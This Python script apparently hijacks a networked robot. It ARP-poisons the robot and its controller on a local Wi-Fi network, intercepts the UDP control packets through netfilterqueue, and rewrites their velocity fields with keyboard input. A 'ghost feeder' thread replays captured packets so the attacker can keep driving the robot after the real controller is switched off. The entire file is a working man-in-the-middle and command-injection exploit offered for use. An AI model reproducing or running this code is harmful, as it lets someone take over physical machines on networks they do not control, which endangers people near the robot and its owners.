from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import time
import subprocess
import struct
import sys
import select
import tty
import termios

# --- SETTINGS ---
robot_ip      = "192.168.0.194"
controller_ip = "192.168.0.16"
interface     = "wlan0"
queue_number  = 1

# Shared control variables
target_linear  = 0.0
target_angular = 0.0
last_packet    = None  # Used to "Ghost" the session if the controller is off

# --- SSH KEYBOARD ENGINE ---
def get_key():
    old_settings = termios.tcgetattr(sys.stdin)
    try:
        tty.setcbreak(sys.stdin.fileno())
        if select.select([sys.stdin], [], [], 0.1)[0]:
            return sys.stdin.read(1)
        return None
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)

def keyboard_control_thread():
    global target_linear, target_angular
    speed = 2.0  # Increased to break through deadzones
    turn = 2.5
    
    print("[*] GHOST DRIVE ACTIVE: W/S (Fwd/Back), A/D (Left/Right), SPACE (Stop)")
    while True:
        key = get_key()
        if key:
            k = key.lower()
            if k == 'w': target_linear = speed; target_angular = 0.0
            elif k == 's': target_linear = -speed; target_angular = 0.0
            elif k == 'a': target_linear = 0.0; target_angular = turn
            elif k == 'd': target_linear = 0.0; target_angular = -turn
            elif k == ' ':
                target_linear = 0.0; target_angular = 0.0
                print("\n[!] EMERGENCY STOP")
        time.sleep(0.02)

# --- MAC & ARP FLOOD ---
def get_mac(ip):
    subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL)
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                fields = line.split()
                if fields[0] == ip: return fields[3]
    except: pass
    return None

def spoof(target_ip, host_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    sendp(packet, iface=interface, verbose=False)

def arp_poison_thread(robot_mac, controller_mac):
    while True:
        spoof(robot_ip, controller_ip, robot_mac)
        spoof(controller_ip, robot_ip, controller_mac)
        time.sleep(0.05) # 20Hz Flood

# --- GHOST FEEDER (Keeps Robot Alive) ---
def ghost_feeder_thread():
    """Generates packets even if the controller is off."""
    global last_packet, target_linear, target_angular
    while True:
        if last_packet and (target_linear != 0 or target_angular != 0):
            pkt = last_packet.copy()
            # Reuse logic to inject and send
            modified_pkt = inject_data(pkt)
            if modified_pkt:
                send(modified_pkt, verbose=False)
        time.sleep(0.05)

# --- THE INJECTION LOGIC ---
def inject_data(scapy_pkt):
    global target_linear, target_angular
    if not scapy_pkt.haslayer(Raw): return None
    
    raw_data = bytearray(scapy_pkt[Raw].load)
    marker_pos = raw_data.find(b'\x15\x05')
    if marker_pos == -1: return None
    
    data_start = raw_data.find(b'\x00\x00\x01\x00', marker_pos)
    if data_start == -1: return None

    # CALIBRATION: Change +4 to +8 if you still see 0.125
    lin_x_off = data_start + 4 
    ang_z_off = lin_x_off + 40
    
    if len(raw_data) >= ang_z_off + 8:
        raw_data[lin_x_off:lin_x_off+8] = struct.pack('<d', float(target_linear))
        raw_data[ang_z_off:ang_z_off+8] = struct.pack('<d', float(target_angular))
        
        scapy_pkt[Raw].load = bytes(raw_data)
        del scapy_pkt[IP].len; del scapy_pkt[IP].chksum
        del scapy_pkt[UDP].len; del scapy_pkt[UDP].chksum
        return scapy_pkt
    return None

# --- NETFILTER QUEUE ---
def process_packet(packet):
    global last_packet
    scapy_pkt = IP(packet.get_payload())
    
    if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(Raw):
        last_packet = scapy_pkt # Save the session
        modified = inject_data(scapy_pkt)
        if modified:
            packet.set_payload(bytes(modified))
    
    packet.accept()

if __name__ == "__main__":
    r_mac = get_mac(robot_ip)
    c_mac = get_mac(controller_ip)
    
    if r_mac and c_mac:
        threading.Thread(target=arp_poison_thread, args=(r_mac, c_mac), daemon=True).start()
        threading.Thread(target=keyboard_control_thread, daemon=True).start()
        threading.Thread(target=ghost_feeder_thread, daemon=True).start()
        
        nfqueue = NetfilterQueue()
        nfqueue.bind(queue_number, process_packet)
        print(f"[*] HIJACK STARTED. Priming session...")
        try:
            nfqueue.run()
        except KeyboardInterrupt:
            nfqueue.unbind()